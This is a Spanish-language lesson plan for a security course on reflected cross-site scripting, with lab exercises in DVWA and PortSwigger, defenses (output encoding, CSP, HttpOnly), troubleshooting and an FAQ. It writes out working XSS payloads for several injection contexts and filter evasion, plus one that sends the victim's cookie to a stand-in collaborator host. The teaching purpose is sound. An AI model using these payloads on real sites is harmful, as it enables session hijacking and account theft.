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096 — Cross-Site Scripting (XSS) reflejado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y explotar el XSS reflejado: cuando la aplicación devuelve input del usuario en la respuesta sin sanitizar, permitiendo ejecutar JavaScript en el navegador de la víctima. Es la puerta de entrada al mundo XSS y a los ataques del lado cliente.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el flujo de un XSS reflejado y su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contextos de inyección (HTML, atributo, JS, URL).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payloads adaptados a cada contexto.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Robar cookies/tokens en un lab para demostrar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Recomendar codificación de salida y CSP como defensa.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Qué es XSS y sus tipos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Flujo del reflejado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Contextos de inyección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Escape de atributos y JS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Impacto: robo de sesión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Filtros y su evasión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Defensa: output encoding, CSP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XSS reflejado: el payload viaja en la petición y se refleja en la respuesta inmediata. Característica: requiere que la víctima abra un enlace preparado.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Contexto de inyección: dónde aterriza el input (cuerpo HTML, atributo, script, URL). Característica: determina la sintaxis del payload.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Output encoding: codificar caracteres especiales al escribir la salida. Característica: defensa principal contra XSS.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CSP (Content Security Policy): cabecera que restringe orígenes de script. Característica: mitiga XSS aunque exista el bug.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Payload polyglot: cadena que funciona en varios contextos. Característica: útil para pruebas rápidas.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HttpOnly: flag de cookie que la oculta a JavaScript. Característica: limita el robo de sesión vía XSS.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DVWA (XSS reflected), Juice Shop, PortSwigger labs.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para probar variaciones y observar reflexiones.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Navegador con DevTools.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DVWA → XSS (Reflected), envía tu nombre y busca dónde se refleja en el HTML.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el payload básico: &lt;script&gt;alert(document.domain)&lt;/script&gt;.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se filtra &lt;script&gt;, prueba manejadores de evento: &lt;img src=x onerror=alert(1)&gt;.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el contexto: ¿estás dentro de un atributo? Cierra comillas: " onmouseover="alert(1).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aterrizas en un bloque &lt;script&gt;, rompe la cadena: ';alert(1)//.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Demuestra impacto en el lab robando la cookie: &lt;script&gt;new Image().src='//tu-collab/?c='+document.cookie&lt;/script&gt;.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la URL de ataque completa que un atacante enviaría a la víctima y explica el flujo.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payload para contexto de atributo y otro para contexto de script.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Evade un filtro que elimina la palabra script (mayúsculas, anidado, eventos).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HttpOnly no evita el XSS, solo mitiga el robo de cookie.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CSP que bloquearía tu payload y explica cómo.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reflejado, almacenado y DOM (adelanto de la próxima clase).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Codifica la salida correctamente en un template server-side para eliminar el bug.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un lab de XSS reflejado de PortSwigger que requiera escapar de un contexto (atributo o script) y ejecutar alert(document.cookie).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lab queda marcado como resuelto, y explicas el contexto de inyección, el payload y qué codificación de salida lo habría prevenido.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payload aparece como texto — Está siendo codificado; busca otro contexto o sink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&lt;script&gt; no ejecuta — CSP o filtro; usa manejadores de evento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alert no salta pero el HTML cambia — Contexto de atributo; cierra la comilla primero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Funciona en Burp pero no en el navegador — El navegador codifica la URL; ajusta encoding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Cookie no se roba — HttpOnly activo; demuestra impacto de otra forma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¿XSS reflejado necesita interacción de la víctima?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Sí: la víctima debe abrir el enlace malicioso. Por eso suele combinarse con phishing.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codificación de entrada o de salida?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salida, según el contexto donde se escribe. La codificación de entrada es útil pero insuficiente por sí sola.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¿CSP elimina el XSS?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lo elimina, lo mitiga: aunque el bug exista, una buena CSP puede impedir que el script se ejecute.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Stuttard &amp; Pinto, The Web Application Hacker's Handbook, cap. 12.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XSS: &lt;https://owasp.org/www-community/attacks/xss/&gt;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XSS Prevention Cheat Sheet.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XSS: &lt;https://portswigger.net/web-security/cross-site-scripting&gt;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